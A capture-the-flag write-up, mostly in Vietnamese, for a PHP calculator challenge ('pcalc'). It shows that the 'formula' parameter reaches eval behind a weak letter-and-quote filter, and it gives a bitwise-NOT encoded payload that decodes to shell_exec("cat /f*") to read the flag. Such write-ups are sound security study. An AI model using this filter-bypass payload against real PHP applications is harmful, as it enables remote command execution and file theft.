pcalc
===
### Description
A calculator service has been deployed at an enemy's agency, for their personel to be acquainted with human numbers. We need to inflitrate the application and get access to the secret flag stored inside it's system!

### Solution
Nhìn vào source code author cung cấp thì ta thấy được chương trình được viết bằng php và theo mô hình MVC
- Phân tích code: File `CalcController.php` này ![image](https://user-images.githubusercontent.com/54855855/115967695-3040e400-a55e-11eb-90f5-7bb9f2dbca85.png)
có một tham số để chúng ta input vào là `formula` và mặc định value của nó là `100*10-3+340` sau đó sẽ được chuyển qua hàm `getCalc` ở file `CalcModel.php` để tính toán
File `CalcModel.php` ![image](https://user-images.githubusercontent.com/54855855/115967743-739b5280-a55e-11eb-81b4-afeb808bec6b.png) input của chúng ta ở đây bị filter `a-z'"` và độ dài input phải < 100. Cuối cùng input của chúng ta được tính toán bằng cách sử dụng `eval` => chúng ta có thể command injection ở đây vì hàm eval là hàm dễ bị tổn thương.
- Với filter ở trên thì khá lỏng lẻo nên ở đây có nhiều cách để rce nó nhưng mình quyết định sử dụng payload với dấu `~`

### Payload
- Code gen kí tự 
```py
hex(~ord("p") & 0xff)
```
=> `(~%8F%97%8F%96%91%99%90)();`
Kết quả ![image](https://user-images.githubusercontent.com/54855855/115967902-60d54d80-a55f-11eb-8aed-dedc00ea1b11.png)
Payload solved
`(~%8c%97%9a%93%93%a0%9a%87%9a%9c)((~%d8%d8%9c%9e%8b%df%d0%99%d5%d8%d8))` -> shell_exec("cat /f*")